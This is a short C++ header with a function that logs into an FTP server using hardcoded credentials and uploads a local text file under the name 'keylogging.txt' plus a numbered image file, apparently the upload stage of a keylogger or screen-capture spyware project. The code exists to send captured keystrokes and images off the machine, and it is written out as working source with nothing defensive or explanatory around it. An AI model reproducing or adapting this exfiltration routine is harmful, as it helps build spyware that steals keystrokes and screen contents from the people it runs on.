#pragma once

#include <CkFtp2.h>
#include <iostream>
#include <fstream>

void ChilkatFtp(int index)
{

    CkFtp2 ftp;
    ftp.put_Username("user");
    ftp.put_Password("1234");

    ftp.put_Hostname("localhost:14147");
    // Connect and login to the FTP server.
    bool success = ftp.Connect();
    if (success != true) {
        std::cout << ftp.lastErrorText() << "\r\n";
        return;
    }

    // upload image

    // Upload a file.
    const char* localPath = "./file.txt";
    const char* remoteFilename = "keylogging.txt";

    success = ftp.PutFile(localPath, remoteFilename);
    if (success != true) {
        std::cout << ftp.lastErrorText() << "\r\n";
        return;
    }

    char buffer[100];
    sprintf_s(buffer, "image%d.png", index);
    const char* localImageName = buffer;
    const char* remoteImageName = buffer;
    success = ftp.PutFile(localImageName, remoteImageName);
    if (success != true) {
        std::cout << ftp.lastErrorText() << "\r\n";
        return;
    }
    success = ftp.Disconnect();

    std::cout << "File Uploaded!" << "\r\n";
}
